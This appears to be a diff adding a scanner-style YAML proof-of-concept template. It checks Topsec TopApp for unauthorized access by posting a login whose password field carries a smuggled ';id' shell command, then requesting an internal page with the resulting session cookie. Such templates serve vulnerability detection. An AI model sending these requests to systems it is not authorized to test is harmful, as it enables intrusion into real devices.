@@ -1,0 +1,34 @@
+id: yaml-poc-topsec-topapp-unauthorized_access-CT-479138
+info:
+  name: Yaml Poc Topsec Topapp Unauthorized_Access Ct 479138
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-topsec-topapp-unauthorized_access-CT-479138'
+  tags: unauth
+  reference:
+  - https://www.cnblogs.com/yuzly/p/13673760.html
+http:
+- method: POST
+  path:
+  - /login_check.php
+  body: userName={{tmp_username}}&password=%3Bid&x=0&y=0
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+    Cookie: PHPSESSID={{tmp_cookie}}
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 302
+- method: GET
+  path:
+  - /acc/Header.php
+  headers:
+    Cookie: PHPSESSID={{tmp_cookie}}
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
